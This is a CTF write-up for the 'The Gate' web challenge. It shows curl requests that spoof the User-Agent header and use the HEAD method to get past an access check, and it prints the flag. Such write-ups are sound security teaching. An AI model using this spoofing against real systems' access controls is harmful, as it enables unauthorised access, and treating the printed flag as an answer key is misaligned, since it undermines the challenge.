---
title: "UpSideCTF: The Gate"
description: "Writeup for The Gate from UpSideCTF. Challenge weight: 85 points."
slug: upsidectf-the-gate
date: 2026-03-25 21:51:25.328+0000
competition: "UpSideCTF"
categories:
    - Web Exploitation
tags:
    - writeup
    - upsidectf
    - the-gate
---

## Challenge

- Competition: [UpSideCTF](https://upsidectf.online/challenges)
- Challenge: `The Gate`
- Category: `Web Exploitation`
- Points: `85`
- Original target(s): [http://140.245.25.63:8004/](http://140.245.25.63:8004/)


## Solve Path

FLAG:
CTF{should_i_stay_or_should_i_head}

WRITEUP:
1) Target Overview
   - URL / endpoint: `http://140.245.25.63:8004/` and `http://140.245.25.63:8004/index.php`
   - Tech stack (if known): Apache/2.4.54 (Debian), PHP/7.4.33
   - Observed behavior: normal `GET`/`POST` requests only change the page theme via the `world` parameter. The real logic is exposed on `HEAD`.

2) Recon
   - Directory discovery: `/robots.txt`, `/admin`, `/api`, `/debug` all returned `404`
   - Parameters found: `world` in `GET` and `POST`; it only changes `<body class>` (`earth`, `upside`, or default `gate`)
   - Cookies / sessions: none observed
   - Headers: `HEAD /index.php` returned `Error: Access Denied. You are not WizardWill.`; `HEAD` with `User-Agent: WizardWill` returned a `Flag:` header
   - JS analysis: none present
   - Hidden endpoints: none needed beyond `/index.php`
   - Source review: landing page contains two forms only:
     - `GET index.php?world=earth`
     - `POST index.php` with `world=upside`

3) Vulnerability
   - Type: header-based auth bypass / identity spoofing
   - Root cause: the application trusts the client-controlled `User-Agent` header as identity and only reveals the secret on the `HEAD` method
   - Proof of vulnerability:
     ```bash
     curl.exe -s -i -X HEAD http://140.245.25.63:8004/index.php
     ```
     Response included:
     ```http
     Error: Access Denied. You are not WizardWill.
     ```
     Then:
     ```bash
     curl.exe -s -i -X HEAD -A WizardWill http://140.245.25.63:8004/index.php
     ```
     Response included:
     ```http
     Flag: CTF{should_i_stay_or_should_i_head}
     ```

4) Exploitation
   - Step-by-step HTTP requests
     ```bash
     curl.exe -s -i http://140.245.25.63:8004/
     ```
     Confirms visible app behavior and parameters.

     ```bash
     curl.exe -s -i -X HEAD http://140.245.25.63:8004/index.php
     ```
     Reveals the hidden gate condition in a response header.

     ```bash
     curl.exe -s -i -X HEAD -A WizardWill http://140.245.25.63:8004/index.php
     ```
     Returns the flag in a response header.
   - Payloads used: HTTP method `HEAD` and header `User-Agent: WizardWill`
   - Why it works: the gate checks who is “asking” by trusting `User-Agent`, and only processes the secret path for `HEAD` requests

5) Flag Extraction
   - Exact request that returns the flag:
     ```bash
     curl.exe -s -i -X HEAD -A WizardWill http://140.245.25.63:8004/index.php
     ```
   - Response proof:
     ```http
     HTTP/1.1 200 OK
     Flag: CTF{should_i_stay_or_should_i_head}
     ```
